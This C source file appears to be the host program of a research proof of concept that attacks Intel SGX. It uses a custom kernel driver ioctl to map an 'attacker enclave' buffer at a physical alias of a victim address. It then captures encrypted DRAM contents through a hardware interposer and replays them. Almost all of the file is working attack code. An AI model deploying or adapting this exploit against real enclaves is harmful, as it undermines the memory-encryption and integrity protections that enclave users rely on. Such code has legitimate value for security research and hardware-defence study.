#include <sgx_urts.h>
#include "Enclave/aae_encl_u.h"
#include <unistd.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include "libsgxstep/pt.h"
#include "libsgxstep/debug.h"

#include "readalias.h"
#include "mem_range_repo.h"
#include "helpers.h"

#define DBG_ENCL           1
#define ALIAS_BIT          34
#define ALLOC_SIZE         1*PAGE_SIZE


sgx_enclave_id_t eid = 0;
unsigned char epc_buf1[ALLOC_SIZE], epc_buf2[ALLOC_SIZE];

#define SGX_MAGIC 0xA4

#define SGX_IOC_EPC_PAGE_ADDR \
        _IOW(SGX_MAGIC, 0x00, struct sgx_epc_page_addr)

struct sgx_epc_page_addr  {
        unsigned long   pa;
        int alloc_nb;
        int nb_pages;
} __attribute__((__packed__));

// Hacky method to avoid linking problems :)
void* sgx_get_aep(void)
{
    return NULL;
}
void sgx_set_aep(void* aep)
{
}
void* sgx_get_tcs(void)
{
    return NULL;
}

uint64_t get_pa(void* va) {
  address_mapping_t *map = get_mappings(va);
  uint64_t pa = phys_address(map, PAGE);
  return pa;
}

page_stats_t stats;

int main( int argc, char **argv )
{
    if(argc != 2 ) {
        printf("Usage: ./app <victim buffer alias pa>\n");
        return -1;
    }

    if (open_kmod()) {
        err_log("Error: Unable to open drive.\n");
        return -1;
    }

    int sgx_fd;

    // Open the SGX driver
    sgx_fd = open("/dev/isgx", O_RDWR);
    if (sgx_fd < 0) {
        perror("Failed to open /dev/isgx\n");
        return -1;
    }

    struct sgx_epc_page_addr args;
    unsigned long victim_pa;
    if( do_stroul(argv[1], 0, &victim_pa)) {
        err_log("failed to parse '%s' as victim_pa\n", argv[1]);
        return -1;
    }
    args.pa = victim_pa;
    args.alloc_nb = 71;
    args.nb_pages = 29;

    // Call the first IOCTL command
    ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);

    info_event("Creating attacker enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/aae_encl.so", /*debug=*/DBG_ENCL,
                                    NULL, NULL, &eid, NULL ) );

    // Get the va of the buffer and translate it to its pa
    unsigned char *buffer;
    SGX_ASSERT( aae_initialize_buffer(eid) );
    SGX_ASSERT( aae_get_buffer_addr(eid, (void*)&buffer) );

    address_mapping_t *map = get_mappings(buffer);
    uint64_t pa = phys_address(map, PAGE);
   
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, get_pa(buffer));
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, get_pa(buffer + 0x1000));
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, get_pa(buffer + 0x2000));
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, get_pa(buffer + 0x3000));
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, get_pa(buffer + 0x1000*28));


    // Flush buffer before capturing to ensure it comes from DRAM
    SGX_ASSERT( aae_flush_buffer(eid) );
    printf("Enable interposer and press enter to capture ciphertext\n");
    getchar();

    SGX_ASSERT( aae_capture_buffer(eid) );

    printf("Enable interposer and press enter to replay ciphertext\n");
    getchar();

    SGX_ASSERT( aae_replay_buffer(eid) );

    printf("Disable interposer and press enter to destroy this enclave\n");
    getchar();

    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info_event("Done.");

    return 0;
}
